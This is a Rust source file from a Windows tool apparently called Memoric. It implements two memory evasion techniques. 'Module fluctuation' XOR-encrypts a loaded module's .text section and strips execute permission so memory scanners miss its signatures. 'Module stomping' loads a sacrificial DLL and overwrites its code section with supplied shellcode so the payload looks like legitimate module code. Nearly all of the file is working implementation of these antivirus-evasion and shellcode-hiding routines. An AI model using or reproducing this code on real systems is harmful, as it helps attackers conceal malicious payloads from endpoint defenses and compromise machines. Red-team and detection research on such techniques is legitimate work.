//! Module Stomping / Fluctuation — encrypt/decrypt module .text on demand to evade memory scanners

use crate::error::MemoricError;
use serde_json::Value;

/// Module Fluctuation — toggle module .text section between encrypted/decrypted
/// When sleeping: .text is encrypted + memory set to RW (no execute)
/// When active: .text is decrypted + memory set to RX
pub fn module_fluctuation(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };

    let module_base = args
        .get("module_base")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing module_base".to_string()))?;
    let action = args
        .get("action")
        .and_then(|v| v.as_str())
        .unwrap_or("encrypt");
    let key = args.get("key").and_then(|v| v.as_u64()).unwrap_or(0x55) as u8;

    tracing::warn!(
        "[EVASION] Module fluctuation: {} at 0x{:X}",
        action,
        module_base
    );

    unsafe {
        let dos_header = module_base as *const u8;

        // Verify DOS header MZ magic
        if *(dos_header as *const u16) != 0x5A4D {
            return Err(MemoricError::MemoryAccess(
                "Invalid PE: missing MZ signature".to_string(),
            ));
        }

        // Get PE header offset from e_lfanew
        let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
        let pe_header = dos_header.add(e_lfanew);

        // Verify PE signature
        if *(pe_header as *const u32) != 0x00004550 {
            return Err(MemoricError::MemoryAccess(
                "Invalid PE: missing PE signature".to_string(),
            ));
        }

        // Get .text section info from Optional Header
        let optional_header = pe_header.add(0x18); // COFF header is 20 bytes after PE sig
        let _size_of_optional = *(pe_header.add(0x14) as *const u16);
        let number_of_sections = *(pe_header.add(0x06) as *const u16) as usize;

        // Section headers start after optional header
        let section_start = optional_header.add(*(pe_header.add(0x14) as *const u16) as usize);

        let mut text_va = 0usize;
        let mut text_size = 0usize;
        let mut found = false;

        for i in 0..number_of_sections {
            let section = section_start.add(i * 40); // IMAGE_SECTION_HEADER is 40 bytes
            let name = std::slice::from_raw_parts(section, 8);
            if name.starts_with(b".text\0") || name.starts_with(b".text") {
                text_va = *(section.add(12) as *const u32) as usize; // VirtualAddress
                text_size = *(section.add(8) as *const u32) as usize; // VirtualSize
                found = true;
                break;
            }
        }

        if !found {
            return Err(MemoricError::MemoryAccess(
                "Could not find .text section".to_string(),
            ));
        }

        let text_addr = module_base + text_va as u64;
        let text_ptr = text_addr as *mut u8;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        match action {
            "encrypt" => {
                // Set RW, encrypt, leave as RW (no execute = hidden from scanners)
                VirtualProtect(
                    text_ptr as *const _,
                    text_size,
                    PAGE_READWRITE,
                    &mut old_protect,
                )
                .map_err(|e| {
                    MemoricError::MemoryAccess(format!("VirtualProtect RW failed: {}", e))
                })?;

                let slice = std::slice::from_raw_parts_mut(text_ptr, text_size);
                for byte in slice.iter_mut() {
                    *byte ^= key;
                }

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "module_fluctuation",
                    "action": "encrypt",
                    "module_base": format!("0x{:016X}", module_base),
                    "text_section": format!("0x{:016X}", text_addr),
                    "text_size": text_size,
                    "protection": "RW (no execute)",
                    "message": format!(".text encrypted ({} bytes), module is dormant — memory scanners will not detect signatures", text_size)
                }))
            }
            "decrypt" => {
                // Decrypt, then set RX (executable again)
                VirtualProtect(
                    text_ptr as *const _,
                    text_size,
                    PAGE_READWRITE,
                    &mut old_protect,
                )
                .map_err(|e| {
                    MemoricError::MemoryAccess(format!("VirtualProtect RW failed: {}", e))
                })?;

                let slice = std::slice::from_raw_parts_mut(text_ptr, text_size);
                for byte in slice.iter_mut() {
                    *byte ^= key;
                }

                VirtualProtect(
                    text_ptr as *const _,
                    text_size,
                    PAGE_EXECUTE_READ,
                    &mut old_protect,
                )
                .map_err(|e| {
                    MemoricError::MemoryAccess(format!("VirtualProtect RX failed: {}", e))
                })?;

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "module_fluctuation",
                    "action": "decrypt",
                    "module_base": format!("0x{:016X}", module_base),
                    "text_section": format!("0x{:016X}", text_addr),
                    "text_size": text_size,
                    "protection": "RX (executable)",
                    "message": format!(".text decrypted ({} bytes), module is active", text_size)
                }))
            }
            _ => Err(MemoricError::WindowsApi(
                "action must be 'encrypt' or 'decrypt'".to_string(),
            )),
        }
    }
}

/// Module Stomping — overwrite a legitimate loaded DLL's .text section with shellcode
/// The shellcode then appears to be inside a known good module
pub fn module_stomp(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::LibraryLoader::LoadLibraryA;
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };

    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            MemoricError::WindowsApi("Missing dll_path (e.g. 'xpsservices.dll')".to_string())
        })?;
    let shellcode_hex = args
        .get("shellcode")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing shellcode (hex string)".to_string()))?;
    let shellcode_addr = args.get("shellcode_address").and_then(parse_address);

    tracing::warn!(
        "[EVASION] Module stomping: overwriting {} .text with shellcode",
        dll_path
    );

    unsafe {
        // Load a sacrificial DLL
        let mut dll_buf = dll_path.as_bytes().to_vec();
        dll_buf.push(0);

        let hmod = LoadLibraryA(windows::core::PCSTR(dll_buf.as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("LoadLibrary failed: {}", e)))?;

        let base = hmod.0 as usize;

        // Parse PE to find .text section
        let dos_header = base as *const u8;
        let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
        let pe_header = dos_header.add(e_lfanew);
        let number_of_sections = *(pe_header.add(0x06) as *const u16) as usize;
        let optional_header = pe_header.add(0x18);
        let section_start = optional_header.add(*(pe_header.add(0x14) as *const u16) as usize);

        let mut text_va = 0usize;
        let mut text_size = 0usize;

        for i in 0..number_of_sections {
            let section = section_start.add(i * 40);
            let name = std::slice::from_raw_parts(section, 8);
            if name.starts_with(b".text") {
                text_va = *(section.add(12) as *const u32) as usize;
                text_size = *(section.add(8) as *const u32) as usize;
                break;
            }
        }

        if text_size == 0 {
            return Err(MemoricError::MemoryAccess(
                "Could not find .text section in sacrificial DLL".to_string(),
            ));
        }

        // Get shellcode bytes
        let shellcode = if let Some(addr) = shellcode_addr {
            // Read from memory address
            let sc_size = args
                .get("shellcode_size")
                .and_then(|v| v.as_u64())
                .unwrap_or(text_size as u64) as usize;
            std::slice::from_raw_parts(addr as *const u8, sc_size).to_vec()
        } else {
            // Parse hex string
            let hex = shellcode_hex
                .replace("\\x", "")
                .replace("0x", "")
                .replace(' ', "");
            (0..hex.len())
                .step_by(2)
                .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap_or(0))
                .collect::<Vec<u8>>()
        };

        if shellcode.len() > text_size {
            return Err(MemoricError::MemoryAccess(format!(
                "Shellcode ({} bytes) exceeds .text section ({} bytes)",
                shellcode.len(),
                text_size
            )));
        }

        // Make .text writable and copy shellcode
        let text_addr = base + text_va;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            text_addr as *const _,
            text_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect failed: {}", e)))?;

        // Zero the section first, then write shellcode
        std::ptr::write_bytes(text_addr as *mut u8, 0, text_size);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), text_addr as *mut u8, shellcode.len());

        // Restore original protection
        VirtualProtect(
            text_addr as *const _,
            text_size,
            old_protect,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect restore failed: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "module_stomping",
            "dll_path": dll_path,
            "module_base": format!("0x{:016X}", base),
            "text_address": format!("0x{:016X}", text_addr),
            "text_size": text_size,
            "shellcode_size": shellcode.len(),
            "message": format!("Shellcode written to {}'s .text section at 0x{:016X}. Execute from there — will appear as legitimate module code.", dll_path, text_addr)
        }))
    }
}
